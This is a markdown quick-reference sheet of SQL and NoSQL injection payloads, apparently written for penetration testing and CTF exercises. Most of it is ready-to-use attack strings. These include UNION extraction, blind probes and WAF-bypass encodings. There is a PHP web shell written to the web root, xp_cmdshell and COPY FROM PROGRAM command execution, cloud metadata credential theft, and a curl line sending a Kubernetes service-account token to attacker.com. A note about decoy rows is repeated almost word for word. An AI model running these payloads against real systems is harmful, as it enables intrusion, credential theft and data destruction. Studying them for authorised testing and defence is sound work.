# SQLi Payloads & Bypass Techniques

Quick-reference for SQL injection testing across DB engines, input vectors, and WAF bypass.

## Detection Probes

### All Input Vectors (params, POST, cookies, headers, API filters, WebSocket)

```
' " ; -- /* */ # ) ( + , \  %
' OR '1'='1
" OR "1"="1
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```

### Boolean Blind

```sql
' OR 1=1 --
' OR 1=2 --
' AND 1=1 --
' AND 1=2 --
```

### Time-Based Blind

```sql
' OR SLEEP(5) --                          -- MySQL
' OR pg_sleep(5) --                       -- PostgreSQL
' WAITFOR DELAY '0:0:5' --               -- MSSQL
'; BEGIN DBMS_LOCK.SLEEP(5); END; --     -- Oracle
```

### JSON Operator Probes

```sql
id=1 AND JSON_EXTRACT('{"a":1}', '$.a')=1   -- MySQL
id=1 AND '{"a":1}'::jsonb ? 'a'             -- PostgreSQL
```

### GraphQL → SQLi

```json
{"query":"query{ users(filter: \"' OR 1=1 --\"){ id email }}"}
```

### WebSocket SQLi

```javascript
ws.send('{"action":"search","query":"test\\\' OR 1=1--"}');
```

### REST API Filter Injection

```json
{"filter": {"name": {"$regex": "admin' OR 1=1--"}}, "sort": "name'; DROP TABLE users--"}
```

---

## UNION Exploitation

### Column Count

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

### Schema Enumeration

```sql
-- Version
' UNION SELECT @@version --              -- MySQL/MSSQL
' UNION SELECT version() --              -- PostgreSQL
' UNION SELECT banner FROM v$version --  -- Oracle

-- Tables
' UNION SELECT table_name,1 FROM information_schema.tables --
' UNION SELECT table_name,1 FROM all_tables --              -- Oracle

-- Columns
' UNION SELECT column_name,1 FROM information_schema.columns WHERE table_name='users' --
```

### Blind Extraction

```sql
-- Boolean char-by-char
' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 0,1)='a'-- -

-- Time conditional
' AND (SELECT CASE WHEN (username='admin') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users)-- -
```

### UNION Column Output Mapping

When UNION works but output isn't visible, map which column renders where:

```sql
-- Use distinguishable values to identify which column maps to which output field
0 UNION SELECT 'COL1',2-- -     -- check: does "COL1" appear as Name/text?
0 UNION SELECT 1,'COL2'-- -     -- check: does "COL2" appear as Name/text?
-- The column that shows in output is your injection point for data extraction
-- Other columns may map to img src, hidden fields, or be discarded
```

**SecOps June 2026:** 2-column UNION — col1 rendered as `Name:`, col2 rendered as `img src=src/{value}`. Initial attempts put `group_concat()` in col2 and got nothing. Swapping to col1 (`0 UNION SELECT group_concat(table_name),2 FROM...`) worked immediately. Always test which column renders in visible output before bulk extraction.

---

## DB-Specific Exploitation

### MySQL

```sql
' UNION SELECT LOAD_FILE('/etc/passwd') --
' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php' --
```

### MSSQL

```sql
'; EXEC xp_cmdshell 'net user' --
'; EXEC xp_regread 'HKEY_LOCAL_MACHINE','SOFTWARE\Microsoft\Windows NT\CurrentVersion','ProductName' --
'; EXEC ('SELECT * FROM OPENROWSET(''SQLOLEDB'',''Server=linked_server;Trusted_Connection=yes'',''SELECT 1'')') --
```

### PostgreSQL

```sql
' UNION SELECT pg_read_file('/etc/passwd',0,1000) --
'; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; --
'; COPY (SELECT '') TO PROGRAM 'curl http://attacker.com/$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)'; --
```

### Oracle

```sql
' UNION SELECT * FROM SYS.USER_ROLE_PRIVS --
' BEGIN DBMS_JAVA.RUNJAVA('java.lang.Runtime.getRuntime().exec(''cmd.exe /c dir'')'); END; --
```

---

## NoSQL Injection

### MongoDB

```
username[$ne]=admin&password[$ne]=
username[$regex]=^adm&password[$regex]=^pass
{"$where": "sleep(5000)"}
{"username": {"$in": ["admin"]}}
```

### Neo4j / Cypher

```cypher
MATCH (u:User) WHERE u.name = 'admin' OR 1=1 //--' RETURN u
```

---

## WAF Bypass

| Technique | Example |
|-----------|---------|
| Case variation | `SeLeCt`, `UnIoN` |
| Comment injection | `UN/**/ION SE/**/LECT` |
| MySQL version comment | `/*!50000UNION*/ /*!50000SELECT*/` — bypasses keyword blacklists that match literal strings but not MySQL conditional comments. The `50000` means "execute if MySQL ≥ 5.0". Works for SELECT, UNION, FROM, WHERE, etc. |
| URL encoding | `%55%4E%49%4F%4E` |
| Hex encoding | `0x53454C454354` |
| Whitespace alt | `UNION/**/SELECT` |
| Null byte | `%00' UNION SELECT...` |
| Double encoding | `%252f` |
| String concat | MySQL: `CONCAT('a','b')`, Oracle: `'a'||'b'`, MSSQL: `'a'+'b'` |
| JSON wrapper | `/**/{\"a\":1}` prefix |
| HTTP/2 smuggling | HPACK compression obscures payloads from perimeter WAFs |

SQLmap tampers: `--tamper=space2comment,charencode` — combine multiple for layered WAFs.

### MySQL Version Comment Bypass (Proven Pattern)

When keyword blacklist blocks `SELECT, UNION, SLEEP, BENCHMARK` (case-insensitive string match):

**Decoy Data Pattern (CTF/Exam):** ALWAYS check multiple rows with `LIMIT N,1` — first row may be a decoy ("keep looking"). SecOps June 2026: flag table row 0 = "keep looking", row 1 = actual flag. Never stop at row 0.

**Column position matters:** If output renders col1 as img src and col2 as Name, put your extraction function in the correct position. Test with `database(),2` vs `1,database()` to find which column displays.

**Decoy row pattern (CTF/Exam):** ALWAYS enumerate rows with `LIMIT N,1` — first row may be a decoy ("keep looking", "try harder"). SecOps June 2026: flag table row 0 = "keep looking", row 1 = real flag. Never stop at the first row.

```sql
-- Bypass using /*!50000 ... */ conditional execution comments
-- Server executes content if MySQL version >= 5.00.00 (virtually all modern MySQL)
0 /*!50000uNiOn*/ /*!50000sElEcT*/ database(),2-- -
0 /*!50000uNiOn*/ /*!50000sElEcT*/ group_concat(table_name separator 0x7c),2 /*!50000from*/ information_schema.tables where table_schema=database()-- -

-- Boolean-based blind still works without UNION/SELECT when filter only blocks those keywords:
1 AND substring(database(),1,1)='c'
1 AND (/*!50000SeLeCt*/ count(*) from information_schema.tables where table_schema=database())>0
```

**SecOps June 2026:** App blacklisted SELECT/UNION/SLEEP/BENCHMARK (case-insensitive). Boolean `AND substring()` worked for char-by-char extraction. Version comments `/*!50000uNiOn*/` bypassed filter for UNION-based extraction. Key: test boolean-based first (no blocked keywords needed for AND/OR/substring), then find UNION bypass for faster bulk extraction.

---

## Cloud SQLi Paths

```sql
-- AWS IMDSv1
' UNION SELECT LOAD_FILE('http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name') --

-- Azure xp_cmdshell
'; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'az vm list'; --

-- Lambda connection pool poisoning (SET ROLE persists across invocations)
-- Injectable: await db.query(`SET ROLE '${event.role}'`)
```

---

## ORM Vulnerabilities (2023-2025)

| ORM | Vulnerable Pattern |
|-----|--------------------|
| Sequelize | `sequelize.literal(\`name = '${input}'\`)` |
| TypeORM <0.3.12 | `repository.findOne({ where: \`id = ${id}\` })` |
| Hibernate 6.x | `session.createQuery("FROM User WHERE name = '" + input + "'")` |
| Prisma <4.11 | `prisma.$executeRawUnsafe(\`SELECT * WHERE id = ${id}\`)` |

---

## Quick Reference

| DB | Version | Time Delay | Concat | Schema |
|----|---------|-----------|--------|--------|
| MySQL | `@@version` | `SLEEP(5)` | `CONCAT()` | `information_schema` |
| MSSQL | `@@version` | `WAITFOR DELAY '0:0:5'` | `'a'+'b'` | `information_schema` / `sys` |
| PostgreSQL | `version()` | `pg_sleep(5)` | `'a'||'b'` | `information_schema` |
| Oracle | `v$version` | `DBMS_PIPE.RECEIVE_MESSAGE('x',5)` | `'a'||'b'` | `all_tables` |
